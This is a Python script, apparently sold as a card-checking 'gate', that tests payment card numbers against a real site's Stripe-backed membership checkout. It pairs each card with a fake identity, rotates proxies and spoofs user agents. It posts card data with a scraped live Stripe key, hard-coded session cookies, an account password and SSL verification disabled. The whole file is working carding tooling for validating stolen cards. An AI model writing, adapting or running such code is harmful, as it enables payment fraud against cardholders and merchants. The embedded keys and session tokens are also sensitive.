import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy

#£24.99
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele6(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=9b7b94cb-e525-43dd-bbb3-8d6a9e722a83c6b1ab&sid=ecb439bf-9664-4302-bc77-4824048c5e33c58dcf&payment_user_agent=stripe.js%2F99c4d0c3e9%3B+stripe-js-v3%2F99c4d0c3e9%3B+split-card-element&referrer=https%3A%2F%2Fmypathway.tv&time_on_page=1048500&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1GeOeOHOnAue0iii'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet6" + Style.RESET_ALL)
    except:
           return '#'


# Define the URL and headers
    url = 'https://mypathway.tv/membership-account/membership-checkout/'

    headers1 = {
        'authority': 'mypathway.tv',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://mypathway.tv',
        'referer': 'https://mypathway.tv/membership-account/membership-checkout/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }
    
    data2 = {
    "AccountNumber": "XXXXXXXXXXXX7010",
    "CardType": "visa",
    "ExpirationMonth": "10",
    "ExpirationYear": "2026",
    "autorenew": "1",
    "autorenew_present": "1",
    "bconfirmemail": "thih09089@bugfoo.com",
    "bemail": "thih09089@bugfoo.com",
    "checkjavascript": "1",
    "discount_code": "",
    "fullname": "",
    "javascriptok": "1",
    "level": "1",
    "other_discount_code": "",
    "password": "Tagiharima28@@Tagiharima28@@",
    "password2": "Tagiharima28@@Tagiharima28@@",
    "payment_method_id": id,
    "submit-checkout": "1",
    "username": "thi09089",
    }

    
    cookies = {
    "__stripe_mid": "9b7b94cb-e525-43dd-bbb3-8d6a9e722a83c6b1ab",
    "__stripe_sid": "ecb439bf-9664-4302-bc77-4824048c5e33c58dcf",
    "_lscache_vary": "165044f142fb03087f2c0d33eefe4c01",
    "bpaf-default-filter": "1",
    "PHPSESSID": "0322751f08b4711919b42289621f0d39",
    "pmpro_visit": "1",
    "wordpress_logged_in_829ebd761a87353ef718a0b8aecbbb2e": "thi09089%7C1698242489%7Cma8sB4JiMiTuRmjNYvtUPUlWyswOeiy46OTEyToRrVR%7C47d95b688b624764969716c100a1f5987f030f2b707c8e41e5c5d8aa7c80d00f",
    }

    
   # Make the POST request
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
print("working gatet 6")
